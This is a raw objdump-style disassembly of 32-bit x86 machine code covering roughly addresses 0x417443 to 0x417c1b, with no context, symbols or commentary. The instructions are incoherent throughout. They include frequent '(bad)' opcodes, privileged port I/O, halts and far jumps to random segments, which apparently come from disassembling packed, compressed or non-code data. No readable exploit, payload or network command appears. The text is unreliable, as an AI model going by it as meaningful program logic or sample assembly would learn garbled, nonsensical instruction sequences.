  417443:	cmp    BYTE PTR [ebp-0x11],0x45
  417447:	psadbw mm5,QWORD PTR [esi]
  41744a:	ins    BYTE PTR es:[edi],dx
  41744b:	sub    bh,bh
  41744d:	int    0xd5
  41744f:	(bad)  
  417450:	callw  0x2ae1
  417454:	inc    esi
  417455:	bound  ebp,QWORD PTR [eax+0x40]
  417458:	push   edi
  417459:	jbe    0x4174a2
  41745b:	xchg   esi,eax
  41745c:	pop    ebx
  41745d:	outs   dx,BYTE PTR ds:[esi]
  41745e:	je     0x417473
  417460:	and    DWORD PTR [edi],ebp
  417462:	test   eax,0xf92f0adc
  417467:	mov    ebx,0x86a8b057
  41746c:	lods   al,BYTE PTR ds:[esi]
  41746d:	aas    
  41746e:	popa   
  41746f:	sub    eax,0xe6e3539d
  417474:	xchg   ebp,eax
  417475:	repz xor BYTE PTR [ebp+0x3a],ah
  417479:	out    dx,eax
  41747a:	pop    es
  41747b:	mov    ah,0x7d
  41747d:	jecxz  0x41748b
  41747f:	ret    0x6da7
  417482:	into   
  417483:	cmc    
  417484:	and    al,0xe5
  417486:	aas    
  417487:	pop    ebp
  417488:	cmp    DWORD PTR [eax+0x45],0x76
  41748c:	mov    ds:0xee06340b,eax
  417491:	inc    ebp
  417492:	ds cwde 
  417494:	rol    DWORD PTR [edx-0x2917d3be],1
  41749a:	cdq    
  41749b:	shl    BYTE PTR [edx-0x5a363751],0x9e
  4174a2:	push   ecx
  4174a3:	and    al,0x57
  4174a5:	dec    eax
  4174a6:	lods   al,BYTE PTR ds:[esi]
  4174a7:	push   edx
  4174a8:	js     0x417464
  4174aa:	cmp    BYTE PTR [ebx+0x28],cl
  4174ad:	push   0xffffff98
  4174af:	add    BYTE PTR [ecx+0x62522302],bl
  4174b5:	mov    dl,0x4b
  4174b7:	scas   al,BYTE PTR es:[edi]
  4174b8:	pop    ss
  4174b9:	and    esi,DWORD PTR [ebx]
  4174bb:	(bad)  
  4174bc:	jmp    FWORD PTR [edi-0x40cba8d4]
  4174c2:	cmp    ch,BYTE PTR [esi]
  4174c4:	jns    0x4174b5
  4174c6:	cwde   
  4174c7:	jns    0x417548
  4174c9:	add    DWORD PTR [esi-0x69],0x13
  4174cd:	stc    
  4174ce:	xchg   ebx,eax
  4174cf:	add    ecx,DWORD PTR [ecx*1-0x5c41776f]
  4174d6:	cmp    DWORD PTR [edi+edi*8],esi
  4174d9:	arpl   WORD PTR [ebp+0x8794d5f],bp
  4174df:	inc    edi
  4174e0:	lds    ebp,FWORD PTR [ebx]
  4174e2:	inc    edi
  4174e3:	mov    dh,0xc4
  4174e5:	push   edi
  4174e6:	aad    0x71
  4174e8:	ret    0xa9f
  4174eb:	bound  ebx,QWORD PTR [ebx+0x53]
  4174ee:	into   
  4174ef:	mov    ecx,0xa0e1c1d9
  4174f4:	pop    ebp
  4174f5:	cmp    al,0x7e
  4174f7:	ret    0x6f7b
  4174fa:	add    dl,cl
  4174fc:	js     0x417520
  4174fe:	mov    bl,0x22
  417500:	sub    al,0xe
  417502:	ror    DWORD PTR [eax],0xf2
  417505:	retf   0x36b3
  417508:	adc    al,0xa7
  41750a:	shr    DWORD PTR fs:[edi],1
  41750d:	dec    esi
  41750e:	sbb    bl,BYTE PTR [ebx-0x64]
  417511:	(bad)  
  417512:	dec    ebx
  417513:	or     eax,0x81d149d5
  417518:	cwde   
  417519:	dec    ebx
  41751a:	out    0x9a,eax
  41751c:	(bad)  [ebp-0x3f57ec20]
  417522:	or     eax,0x9c5305fb
  417527:	add    eax,0xc1cd4e2d
  41752c:	mov    ds:0x3dc95600,eax
  417531:	jnp    0x41754c
  417533:	test   esp,edi
  417535:	sub    al,0xd7
  417537:	bound  eax,QWORD PTR [edx]
  417539:	retf   
  41753a:	mov    ah,BYTE PTR [ebp+0x7d]
  41753d:	imul   DWORD PTR [ebp-0x22]
  417540:	xchg   esp,eax
  417541:	sahf   
  417542:	icebp  
  417543:	inc    ebp
  417544:	out    0xf2,al
  417546:	ds pop ss
  417548:	mov    bl,0xf9
  41754a:	cli    
  41754b:	sbb    ebp,DWORD PTR [edx]
  41754d:	sti    
  41754e:	int3   
  41754f:	fild   WORD PTR [edi]
  417551:	xchg   ebx,eax
  417552:	into   
  417553:	xor    al,0x7d
  417555:	push   esp
  417556:	adc    al,0xbb
  417558:	imul   ebx,DWORD PTR [edx],0x4c
  41755b:	test   al,0x96
  41755d:	inc    esi
  41755e:	mov    ds:0xbc81edcf,eax
  417563:	and    al,BYTE PTR [esi]
  417565:	ss out dx,eax
  417567:	adc    al,0xe3
  417569:	cmp    edi,edi
  41756b:	loope  0x4175c7
  41756d:	mul    BYTE PTR [esp+eiz*8-0x7c]
  417571:	jnp    0x4175cb
  417573:	fild   QWORD PTR gs:[ecx]
  417576:	enter  0xe061,0x94
  41757a:	inc    ebp
  41757b:	adc    eax,0x8b77279b
  417580:	fstp   DWORD PTR [edx]
  417582:	xor    ebp,0x2a707fe1
  417588:	sub    cl,BYTE PTR [ecx-0x24149bf6]
  41758e:	sub    bl,BYTE PTR [eax+0x7f66217e]
  417594:	cmp    DWORD PTR [edx+0x31465340],0xffffffaa
  41759b:	push   edi
  41759c:	jp     0x4175f0
  41759e:	fcmovu st,st(5)
  4175a0:	inc    esp
  4175a1:	jecxz  0x41754a
  4175a3:	jg     0x4175fd
  4175a5:	dec    esi
  4175a6:	call   0xc701:0x4acfe9ee
  4175ad:	out    dx,eax
  4175ae:	jecxz  0x4175d0
  4175b0:	lods   al,BYTE PTR ds:[esi]
  4175b1:	out    dx,al
  4175b2:	pop    ds
  4175b3:	cmc    
  4175b4:	adc    eax,0x734ff457
  4175b9:	hlt    
  4175ba:	sbb    DWORD PTR [ebp-0x11],ecx
  4175bd:	jae    0x41758f
  4175bf:	stc    
  4175c0:	sti    
  4175c1:	add    al,0xe6
  4175c3:	dec    esi
  4175c4:	repz aaa 
  4175c6:	js     0x417572
  4175c8:	mov    eax,ds:0x1703917a
  4175cd:	mov    ebx,DWORD PTR [ecx+ebp*8]
  4175d0:	jne    0x4175c8
  4175d2:	ret    0x2eea
  4175d5:	lock (bad) [edi]
  4175d8:	das    
  4175d9:	enter  0xde40,0x51
  4175dd:	out    0x84,eax
  4175df:	push   ecx
  4175e0:	scas   eax,DWORD PTR es:[edi]
  4175e1:	push   0x1c05d60e
  4175e6:	and    ecx,0x2baea004
  4175ec:	inc    ecx
  4175ed:	pop    ss
  4175ee:	ja     0x417592
  4175f0:	mov    cl,0xdc
  4175f2:	cmp    ebx,DWORD PTR [ebp-0x14]
  4175f5:	arpl   si,di
  4175f7:	jmp    0x963b:0xdfe68e58
  4175fe:	push   edx
  4175ff:	stc    
  417600:	xor    BYTE PTR [ebx],cl
  417602:	cmc    
  417603:	clc    
  417604:	(bad)  
  417606:	cmp    DWORD PTR [eax],esp
  417608:	sbb    BYTE PTR [eax+0x1a7003c3],dh
  41760e:	rcr    DWORD PTR [eax-0x1a02fd0d],cl
  417614:	sub    BYTE PTR [ecx],ah
  417616:	push   eax
  417617:	shl    BYTE PTR [esi-0x21339d61],cl
  41761d:	adc    bh,BYTE PTR [edx+edx*8+0x58]
  417621:	loopne 0x4175ef
  417623:	int    0x91
  417625:	pop    esi
  417626:	inc    eax
  417627:	mov    dh,BYTE PTR [edx+ecx*8+0x75295994]
  41762e:	dec    edi
  41762f:	pop    edx
  417630:	jmp    0xcc71:0x5edf8fc0
  417637:	jae    0x41760e
  417639:	fld    TBYTE PTR [edx+0x63]
  41763c:	and    dl,BYTE PTR [eax+0x1e]
  41763f:	mov    esp,DWORD PTR [ebx+edx*4]
  417642:	out    0x77,eax
  417644:	hlt    
  417645:	imul   ecx,edx,0xfffffff0
  417648:	dec    ebx
  417649:	xchg   ecx,eax
  41764a:	and    DWORD PTR [ebx+0x13dfee1b],ebx
  417650:	jmp    0xbae7:0x469ff9a3
  417657:	rcr    BYTE PTR [edx+0x41e4e66b],1
  41765d:	ror    BYTE PTR [eax+0x3],0x42
  417661:	push   edi
  417662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417663:	sbb    eax,0x79a8e83d
  417668:	xlat   BYTE PTR ds:[ebx]
  417669:	adc    BYTE PTR [esi+0x59],bh
  41766c:	pop    ebp
  41766d:	in     eax,dx
  41766e:	jns    0x417625
  417670:	push   ebx
  417671:	add    edi,ecx
  417673:	inc    edx
  417674:	pop    ecx
  417675:	push   esi
  417676:	push   es
  417677:	pop    es
  417678:	ja     0x4176ed
  41767a:	fld    st(0)
  41767c:	jmp    0x6a4:0xa79468c4
  417683:	test   cl,0x2e
  417686:	je     0x417650
  417688:	int    0x59
  41768a:	mov    dh,0xc7
  41768c:	addr16 int3 
  41768e:	loopne 0x417649
  417690:	inc    ecx
  417691:	xor    al,0x1d
  417693:	fdiv   QWORD PTR [ecx]
  417695:	aam    0xa6
  417697:	jp     0x4176f0
  417699:	sbb    esp,edi
  41769b:	dec    edx
  41769c:	and    DWORD PTR [edx],ecx
  41769e:	retf   0x5073
  4176a1:	jns    0x41771f
  4176a3:	mov    ch,0x94
  4176a5:	mul    edi
  4176a7:	popf   
  4176a8:	mov    WORD PTR [ebp+ecx*1-0x2],ss
  4176ac:	xchg   ebp,eax
  4176ad:	bound  ebp,QWORD PTR [ebx-0x7ae87987]
  4176b3:	xchg   DWORD PTR [esi+0xd],esp
  4176b6:	test   al,0x5f
  4176b8:	xchg   esp,eax
  4176b9:	add    al,0x97
  4176bb:	js     0x4176bc
  4176bd:	fldenv [esi+0x6e]
  4176c0:	iret   
  4176c1:	add    dl,BYTE PTR ds:0x1da94db7
  4176c7:	aad    0x60
  4176c9:	fistp  DWORD PTR [edx+0x45]
  4176cc:	adc    eax,0x1b742f82
  4176d1:	jb     0x41772b
  4176d3:	stc    
  4176d4:	adc    DWORD PTR [ecx+0x52],ebx
  4176d7:	and    al,BYTE PTR [eax-0x5ae2a64f]
  4176dd:	adc    al,0x4b
  4176df:	and    al,0x3f
  4176e1:	mov    ds:0xcf06407,eax
  4176e6:	pop    edi
  4176e7:	mov    al,ds:0x6b549c17
  4176ec:	sbb    al,BYTE PTR [ebx+0x10aa2c7b]
  4176f2:	js     0x417763
  4176f4:	pushf  
  4176f5:	mov    dh,0xd7
  4176f7:	mov    edi,0x8eef99ff
  4176fc:	push   ebp
  4176fd:	add    al,0x43
  4176ff:	mov    cl,0xc9
  417701:	pop    edx
  417702:	adc    ch,bl
  417704:	enter  0x8a09,0x64
  417708:	push   0xd7ddd76b
  41770d:	fcomip st,st(4)
  41770f:	dec    esi
  417710:	pushf  
  417711:	push   ecx
  417712:	(bad)  
  417713:	out    dx,eax
  417714:	ret    
  417715:	out    0x2c,eax
  417717:	jb     0x4176a4
  417719:	xchg   ebx,eax
  41771a:	sbb    eax,0x92f6785c
  41771f:	int    0xa5
  417721:	retf   
  417722:	ret    
  417723:	or     eax,0x102194a5
  417728:	sub    ah,BYTE PTR [ecx+0x8]
  41772b:	sbb    edi,ebp
  41772d:	lods   al,BYTE PTR ds:[esi]
  41772e:	cdq    
  41772f:	int    0x36
  417731:	adc    DWORD PTR [edi+0x7b],ecx
  417734:	add    BYTE PTR [ebx-0x14b325b],0xfa
  41773b:	sahf   
  41773c:	push   esp
  41773d:	pop    esi
  41773e:	pusha  
  41773f:	dec    esp
  417740:	dec    ecx
  417741:	jle    0x4177b2
  417743:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  417745:	push   edx
  417746:	lea    esi,[ecx]
  417748:	sub    al,0x79
  41774a:	push   cs
  41774b:	dec    esp
  41774c:	xchg   edi,eax
  41774d:	sti    
  41774e:	fst    DWORD PTR [ebp+0x28a72d88]
  417754:	mov    esp,0x1d60f6c5
  417759:	test   al,0xfe
  41775b:	mov    ds:0xcde19ef7,eax
  417760:	cmc    
  417761:	xchg   edx,eax
  417762:	out    dx,eax
  417763:	cmp    ebx,esp
  417765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417766:	retf   0x81b0
  417769:	xor    eax,0x976add9e
  41776e:	jp     0x417779
  417770:	jl     0x4176f4
  417772:	daa    
  417773:	jb     0x4177b2
  417775:	sub    DWORD PTR [edi],esp
  417777:	in     al,dx
  417778:	sbb    dh,BYTE PTR [eax-0x11dcf391]
  41777e:	xchg   sp,ax
  417780:	lds    ebx,FWORD PTR [eax-0x4efab3ba]
  417786:	and    al,BYTE PTR [esi-0x4f]
  417789:	add    BYTE PTR [edx+0x1e],cl
  41778c:	out    0x8e,eax
  41778e:	cs call 0x712e:0x89ca7ff1
  417796:	pushf  
  417797:	sub    BYTE PTR [ebp-0x6a],dh
  41779a:	push   edx
  41779b:	xchg   ebp,eax
  41779c:	enter  0x6fa4,0x74
  4177a0:	arpl   WORD PTR [ebp-0x2df3d1bc],dx
  4177a6:	jge    0x4177df
  4177a8:	popa   
  4177a9:	aam    0x1f
  4177ab:	call   0xc177:0x58cbf58a
  4177b2:	je     0x417818
  4177b4:	daa    
  4177b5:	jp     0x41774f
  4177b7:	push   es
  4177b8:	push   ds
  4177b9:	push   edx
  4177ba:	sbb    bl,ah
  4177bc:	daa    
  4177bd:	pop    ebx
  4177be:	mov    cl,0x6e
  4177c0:	jl     0x417747
  4177c2:	imul   ebx,DWORD PTR [eax],0x2
  4177c5:	sub    eax,0x638e870b
  4177ca:	out    0xe5,al
  4177cc:	jbe    0x4177d1
  4177ce:	mov    BYTE PTR [esi-0x15],bl
  4177d1:	seto   BYTE PTR [ebp+0x2]
  4177d5:	repz ds icebp 
  4177d8:	shl    al,1
  4177da:	xor    BYTE PTR [ecx+0x3df01ddf],cl
  4177e0:	jns    0x417763
  4177e2:	dec    dl
  4177e4:	dec    esi
  4177e5:	pop    ecx
  4177e6:	add    al,0x37
  4177e8:	sub    eax,DWORD PTR [esi-0x4774f822]
  4177ee:	hlt    
  4177ef:	sub    al,al
  4177f1:	add    ecx,ebx
  4177f3:	adc    DWORD PTR [edi],ebp
  4177f5:	xchg   ebp,eax
  4177f6:	mov    ecx,cs
  4177f8:	or     DWORD PTR [ebx+esi*1],ecx
  4177fb:	xchg   ecx,eax
  4177fc:	inc    eax
  4177fd:	ficom  WORD PTR [ecx-0x17]
  417800:	mov    BYTE PTR [eax],0x70
  417803:	sub    eax,0xb53448b5
  417808:	adc    DWORD PTR [ebx],edx
  41780a:	fnstsw WORD PTR [edx-0x22]
  41780d:	inc    ecx
  41780e:	cwde   
  41780f:	mov    ds:0x8fdbec3,eax
  417814:	inc    edi
  417815:	inc    edi
  417816:	jne    0x41780b
  417818:	cmp    DWORD PTR [edi+0x22be793e],edi
  41781e:	rol    DWORD PTR [eax-0x14],1
  417821:	retf   
  417822:	push   ds
  417823:	jge    0x41789c
  417825:	(bad)  
  417826:	mov    eax,ds:0x6b3e1cd6
  41782b:	int    0xdb
  41782d:	pop    es
  41782e:	fnsave [ebp+0x3f1b89ff]
  417834:	mov    esi,0x7695541
  417839:	dec    ebx
  41783a:	xchg   ecx,eax
  41783b:	jno    0x4177f3
  41783d:	pop    edx
  41783e:	test   eax,0x2d519a9c
  417843:	test   eax,0x50e5d2c8
  417848:	fmul   QWORD PTR [ebx]
  41784a:	dec    ebp
  41784b:	cli    
  41784c:	sbb    BYTE PTR ds:0x52542aba,dh
  417852:	pusha  
  417853:	or     DWORD PTR [ecx+eiz*8],0x99ebbbff
  41785a:	jbe    0x417873
  41785c:	push   ebx
  41785d:	aad    0x15
  41785f:	mov    cl,0xa9
  417861:	call   0xcbf56c35
  417866:	mov    BYTE PTR [ebx+0x4d],ch
  417869:	push   0x33e678c6
  41786e:	scas   al,BYTE PTR es:[edi]
  41786f:	loop   0x417802
  417871:	(bad)  
  417872:	jl     0x41789d
  417874:	xchg   esi,eax
  417875:	or     bl,BYTE PTR [edx-0x1f73b691]
  41787b:	les    ebp,FWORD PTR [esi-0x56002d8]
  417881:	xor    DWORD PTR [esp+eiz*2-0x12],eax
  417885:	pop    ecx
  417886:	fdiv   QWORD PTR [ebp+0x4460c089]
  41788c:	call   0x1131ad23
  417891:	jo     0x417835
  417893:	cwde   
  417894:	pop    es
  417895:	out    dx,al
  417896:	es dec eax
  417898:	test   DWORD PTR [ecx+0x6f],edi
  41789b:	in     al,dx
  41789c:	inc    edi
  41789d:	fldenv [ebx+0x1842e5bb]
  4178a3:	pop    ss
  4178a4:	jae    0x41788e
  4178a6:	jl     0x4178f0
  4178a8:	dec    esi
  4178a9:	mov    dh,0x4f
  4178ab:	es enter 0xe2ab,0xe1
  4178b0:	std    
  4178b1:	cld    
  4178b2:	push   cs
  4178b3:	mov    al,ds:0x4f4a0821
  4178b8:	(bad)  
  4178b9:	sbb    al,0xce
  4178bb:	push   esp
  4178bc:	mov    dh,ch
  4178be:	mov    cl,0x44
  4178c0:	push   esp
  4178c1:	mov    edi,0x943bf07c
  4178c6:	sahf   
  4178c7:	pop    edi
  4178c8:	pop    ebp
  4178c9:	mov    ebx,0xc80add4d
  4178ce:	lock js 0x417919
  4178d1:	lds    ebx,FWORD PTR [ecx]
  4178d3:	mov    edx,0xfa7d475d
  4178d8:	xchg   ecx,eax
  4178d9:	jno    0x417929
  4178db:	jae    0x4178b5
  4178dd:	data16 (bad) 
  4178df:	arpl   WORD PTR [eax],si
  4178e1:	arpl   bx,cx
  4178e3:	pop    ebx
  4178e4:	sub    al,0xc8
  4178e6:	repnz dec esp
  4178e8:	mov    ch,0x86
  4178ea:	add    BYTE PTR [edx+0x6ffabb2e],cl
  4178f0:	sub    ebp,DWORD PTR [edi-0x70791d78]
  4178f6:	jo     0x4178ba
  4178f8:	loope  0x41789c
  4178fa:	mov    DWORD PTR [ebp-0x76],ebx
  4178fd:	pop    ecx
  4178fe:	mov    ch,0x1c
  417900:	cmp    esp,edi
  417902:	jge    0x4178b9
  417904:	inc    esp
  417905:	sub    DWORD PTR [ecx+edx*1+0xedda36a],edx
  41790c:	mov    ch,0x45
  41790e:	int3   
  41790f:	adc    dh,dl
  417911:	mov    dh,0x11
  417913:	mov    ecx,0xeada169f
  417918:	(bad)  
  41791a:	pop    eax
  41791b:	mov    ecx,0x3e8e8ec2
  417920:	xor    al,0xcd
  417922:	ins    BYTE PTR es:[edi],dx
  417923:	test   eax,0x7b5387f1
  417928:	jno    0x4178ae
  41792a:	data16 cmp dl,BYTE PTR fs:[esi-0x1b]
  41792f:	jecxz  0x4178d7
  417931:	mov    bl,0x66
  417933:	les    ebp,FWORD PTR [eax+0x36]
  417936:	int3   
  417937:	jns    0x4178fb
  417939:	pop    edi
  41793a:	outs   dx,BYTE PTR ds:[esi]
  41793b:	(bad)  
  41793c:	gs push es
  41793e:	adc    bh,BYTE PTR [ebx-0x12]
  417941:	enter  0xabff,0x1b
  417945:	cli    
  417946:	(bad)  
  417947:	cmp    eax,0x9814be18
  41794c:	pop    ss
  41794d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41794e:	test   BYTE PTR [ecx+0x53],bl
  417951:	mov    eax,ds:0x60a0ad2d
  417956:	popa   
  417957:	mov    ebx,0x24e6b315
  41795c:	sbb    eax,0xaaac8af2
  417961:	mov    ebp,0x6cded15c
  417966:	popf   
  417967:	sbb    eax,0x21b269f2
  41796c:	aad    0x9
  41796e:	add    eax,DWORD PTR [ecx+ebx*2]
  417971:	add    dl,BYTE PTR [eax]
  417973:	add    al,0x2a
  417975:	outs   dx,DWORD PTR ds:[esi]
  417976:	add    al,0x1
  417978:	arpl   WORD PTR [esi],cx
  41797a:	dec    edx
  41797b:	sti    
  41797c:	popf   
  41797d:	rcl    BYTE PTR [ecx-0x4f],cl
  417980:	cmp    ah,BYTE PTR [eax-0x58]
  417983:	lahf   
  417984:	dec    esp
  417985:	je     0x4179da
  417987:	xchg   DWORD PTR [edx+esi*2+0x5ec385ed],edi
  41798e:	mov    ebp,0x7d270338
  417993:	addr16 push esp
  417995:	cmp    ebp,DWORD PTR [ebp-0x41]
  417998:	dec    ecx
  417999:	xor    DWORD PTR [eax-0x45],edx
  41799c:	xor    DWORD PTR [ecx-0x38],0xb21f9459
  4179a3:	pushf  
  4179a4:	mov    bl,0x3b
  4179a6:	sbb    dl,BYTE PTR [esi-0x3ee5521a]
  4179ac:	sub    eax,0xeb00eb3f
  4179b1:	cmp    BYTE PTR [ebx-0x1e],dl
  4179b4:	dec    edx
  4179b5:	lea    ebx,[esi-0x23]
  4179b8:	cdq    
  4179b9:	mov    al,0xed
  4179bb:	mov    bh,0x31
  4179bd:	cmp    al,0x7b
  4179bf:	push   cs
  4179c0:	gs in  eax,0xd8
  4179c3:	inc    ecx
  4179c4:	mov    esp,0xb75b7fe5
  4179c9:	out    dx,al
  4179ca:	sbb    dl,0xa3
  4179cd:	xchg   ebp,eax
  4179ce:	(bad)  
  4179cf:	cmc    
  4179d0:	xor    cl,BYTE PTR [eax+ebx*2+0x14]
  4179d4:	mov    ebp,0x50f5d4f7
  4179d9:	jno    0x41799a
  4179db:	sbb    eax,0xc470fcf3
  4179e1:	arpl   WORD PTR [esi+0x78],bx
  4179e4:	mov    dx,0xbd10
  4179e8:	mov    esi,0x1e9ad854
  4179ed:	dec    eax
  4179ee:	icebp  
  4179ef:	jle    0x41799f
  4179f1:	ins    DWORD PTR es:[edi],dx
  4179f2:	and    dh,0x38
  4179f5:	in     al,dx
  4179f6:	setno  BYTE PTR [ebx+edx*4]
  4179fa:	fimul  DWORD PTR [eax+0x43310449]
  417a00:	add    ecx,ebx
  417a02:	dec    ebx
  417a03:	xor    ebx,eax
  417a05:	out    dx,al
  417a06:	pop    ecx
  417a07:	mov    ebp,0xa458d9ad
  417a0c:	aas    
  417a0d:	pop    esi
  417a0e:	popa   
  417a0f:	sbb    DWORD PTR [ebx],ebp
  417a11:	lods   eax,DWORD PTR ds:[esi]
  417a12:	pop    esp
  417a13:	arpl   WORD PTR [ebx],di
  417a15:	mov    ebp,DWORD PTR [esi]
  417a17:	inc    ebx
  417a18:	(bad)  
  417a19:	clc    
  417a1a:	loopne 0x417a1b
  417a1c:	fimul  DWORD PTR [eax+0x39ba4f75]
  417a22:	inc    edi
  417a23:	and    eax,0x2b67c078
  417a28:	mul    al
  417a2a:	jo     0x4179fb
  417a2c:	inc    edx
  417a2d:	(bad)  
  417a2e:	fadd   DWORD PTR ds:0x91a15c7e
  417a34:	or     dl,BYTE PTR [eax-0x6c99e4c0]
  417a3a:	inc    ebx
  417a3b:	fsubp  st(5),st
  417a3d:	call   0xbc3bed91
  417a42:	dec    ebx
  417a43:	mov    bh,0x69
  417a45:	mov    al,0x82
  417a47:	jp     0x417a71
  417a49:	hlt    
  417a4a:	pushf  
  417a4b:	inc    eax
  417a4c:	mov    ?,WORD PTR [edx-0x4534312d]
  417a52:	and    DWORD PTR [eax+0x13],ecx
  417a55:	mov    ch,bl
  417a57:	lahf   
  417a58:	loope  0x4179fc
  417a5a:	stos   BYTE PTR es:[edi],al
  417a5b:	or     al,BYTE PTR [ecx+eiz*1-0x7c]
  417a5f:	and    bl,dh
  417a61:	ret    
  417a62:	xor    BYTE PTR [ebx-0x3b],dh
  417a65:	sbb    al,0x3c
  417a67:	jb     0x417a9f
  417a69:	xchg   ebx,eax
  417a6a:	cdq    
  417a6b:	enter  0xd153,0x94
  417a6f:	icebp  
  417a70:	hlt    
  417a71:	or     eax,0x1b279360
  417a76:	sahf   
  417a77:	jbe    0x4179f9
  417a79:	xor    ch,dh
  417a7b:	jecxz  0x417aa3
  417a7d:	xchg   ebp,eax
  417a7e:	jle    0x417a95
  417a80:	fdiv   QWORD PTR [esi+0x67]
  417a83:	fldenv [eax+ecx*4-0x404a980]
  417a8a:	jg     0x417a16
  417a8c:	jmp    FWORD PTR [edi+0x7a4c574e]
  417a92:	dec    ecx
  417a93:	mov    WORD PTR [edi],es
  417a95:	scas   al,BYTE PTR es:[edi]
  417a96:	cmc    
  417a97:	adc    DWORD PTR ds:0xdbb641ec,ecx
  417a9d:	fdiv   QWORD PTR [ecx-0x1348ca21]
  417aa3:	and    bl,BYTE PTR [edi+eiz*4-0x7e]
  417aa7:	xchg   esi,eax
  417aa8:	dec    esp
  417aa9:	inc    ecx
  417aaa:	xchg   edi,eax
  417aab:	and    ecx,ebp
  417aad:	push   cs
  417aae:	test   al,0x5d
  417ab0:	add    DWORD PTR [edi],0x1f5f4efd
  417ab6:	pusha  
  417ab7:	std    
  417ab8:	lock xchg edx,eax
  417aba:	lods   eax,DWORD PTR ds:[esi]
  417abb:	cmc    
  417abc:	les    esi,FWORD PTR [eax+0x176a5abe]
  417ac2:	aam    0x84
  417ac4:	lds    edi,FWORD PTR ds:0xe10d84eb
  417aca:	xchg   ebp,eax
  417acb:	cmp    eax,0x8b6ceab7
  417ad0:	dec    esp
  417ad1:	loop   0x417ac0
  417ad3:	fldcw  WORD PTR [edx-0x2269fb70]
  417ad9:	gs aas 
  417adb:	xchg   ebx,eax
  417adc:	xlat   BYTE PTR ds:[ebx]
  417add:	mov    WORD PTR [ebp+0x79],fs
  417ae0:	frstor [eax]
  417ae2:	jae    0x417b2b
  417ae4:	inc    esp
  417ae5:	loop   0x417af0
  417ae7:	scas   al,BYTE PTR es:[edi]
  417ae8:	push   cs
  417ae9:	jbe    0x417abd
  417aeb:	sbb    BYTE PTR [eax-0x19],ah
  417aee:	ror    BYTE PTR [esi-0x1b],1
  417af1:	or     ch,BYTE PTR [esi]
  417af3:	push   0x5c4dcef5
  417af8:	mov    bl,BYTE PTR [ecx+eiz*1-0x28]
  417afc:	dec    esi
  417afd:	pop    eax
  417afe:	pop    eax
  417aff:	dec    ebp
  417b00:	mov    ch,0x4c
  417b02:	jns    0x417aed
  417b04:	mov    bl,0xf1
  417b06:	push   0xffffffbd
  417b08:	mov    al,ds:0xb451c464
  417b0d:	mov    DWORD PTR [esi],ebp
  417b0f:	xor    al,0xdb
  417b11:	aas    
  417b12:	mov    WORD PTR [esi-0x2482889],es
  417b18:	mov    dl,0xd1
  417b1a:	repz push ds
  417b1c:	es leave 
  417b1e:	pop    edi
  417b1f:	inc    edx
  417b20:	loop   0x417b00
  417b22:	pop    ds
  417b23:	jle    0x417b4a
  417b25:	xor    edx,DWORD PTR [esi]
  417b27:	mov    ecx,0x466c3b04
  417b2c:	mul    esi
  417b2e:	pop    es
  417b2f:	or     ch,dl
  417b31:	clc    
  417b32:	es xor ebx,edx
  417b35:	sub    esp,0xd910309c
  417b3b:	pop    ss
  417b3c:	adc    DWORD PTR [esi+0xc],edi
  417b3f:	sub    eax,0x7cd5e95c
  417b44:	add    BYTE PTR [eax+0x1699d94c],al
  417b4a:	mov    WORD PTR [ecx],?
  417b4c:	adc    eax,0xa18601a3
  417b51:	(bad)  
  417b52:	pop    ds
  417b53:	and    ch,bh
  417b55:	pop    edi
  417b56:	xchg   eax,eax
  417b58:	test   eax,0x263fda85
  417b5d:	sub    ecx,ebx
  417b5f:	jp     0x417b4c
  417b61:	and    DWORD PTR [edx-0x53],edx
  417b64:	out    dx,eax
  417b65:	push   esi
  417b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b67:	dec    ebp
  417b68:	push   edi
  417b69:	sbb    edx,DWORD PTR ds:[ebp-0x4]
  417b6d:	add    ebp,edx
  417b6f:	add    ecx,edx
  417b71:	aad    0xbe
  417b73:	add    ch,BYTE PTR [edi]
  417b75:	scas   eax,DWORD PTR es:[edi]
  417b76:	jbe    0x417b9b
  417b78:	mov    dh,BYTE PTR [edi+0x3d]
  417b7b:	int3   
  417b7c:	sub    eax,0xe4a77f3a
  417b81:	imul   esp,DWORD PTR [esi-0x7e3a80e7],0x27992b28
  417b8b:	jmp    0x862c4150
  417b90:	mov    dh,0xfb
  417b92:	and    ebp,0x52
  417b95:	out    0x58,al
  417b97:	sahf   
  417b98:	jmp    0xf8b559a0
  417b9d:	or     eax,0xdff235d0
  417ba2:	mov    eax,0x3c063190
  417ba7:	dec    ebx
  417ba8:	mov    eax,0xea42b2c
  417bad:	arpl   bp,ax
  417baf:	das    
  417bb0:	iret   
  417bb1:	mul    BYTE PTR [ecx+0x2]
  417bb4:	xchg   ecx,eax
  417bb5:	cdq    
  417bb6:	adc    BYTE PTR [esi],ch
  417bb8:	push   esp
  417bb9:	cmp    edx,edx
  417bbb:	push   ecx
  417bbc:	fwait
  417bbd:	or     ah,BYTE PTR [ecx-0x32]
  417bc0:	add    cl,al
  417bc2:	add    al,0x18
  417bc4:	ss xor al,0x87
  417bc7:	sub    dl,dh
  417bc9:	fst    DWORD PTR [eax+eiz*1+0xe]
  417bcd:	ret    0x57e9
  417bd0:	and    al,0x24
  417bd2:	adc    ebx,eax
  417bd4:	call   0xc5ff:0x710efd91
  417bdb:	cmp    BYTE PTR [ecx],dl
  417bdd:	aaa    
  417bde:	jb     0x417b7e
  417be0:	in     eax,dx
  417be1:	data16 xchg BYTE PTR [esi-0x44],al
  417be5:	push   0xffffffe6
  417be7:	cmp    al,0x70
  417be9:	add    dl,BYTE PTR [ebx-0x7e]
  417bec:	and    DWORD PTR [esi-0x54],eax
  417bef:	or     al,BYTE PTR [ebx-0x3e49e2c2]
  417bf5:	enter  0x60bd,0xf
  417bf9:	cmc    
  417bfa:	shl    BYTE PTR [ebp+0x11],0xf6
  417bfe:	lahf   
  417bff:	sbb    eax,0x4af4d5f0
  417c04:	sti    
  417c05:	scas   al,BYTE PTR es:[edi]
  417c06:	push   edi
  417c07:	cmp    BYTE PTR [ecx-0x5a29fbe3],bh
  417c0d:	std    
  417c0e:	repz jno 0x417c50
  417c11:	and    dh,ch
  417c13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c14:	inc    ecx
  417c15:	jae    0x417c3c
  417c17:	in     eax,dx
  417c18:	div    DWORD PTR [ebx-0x10]
  417c1b:	pop    ebp
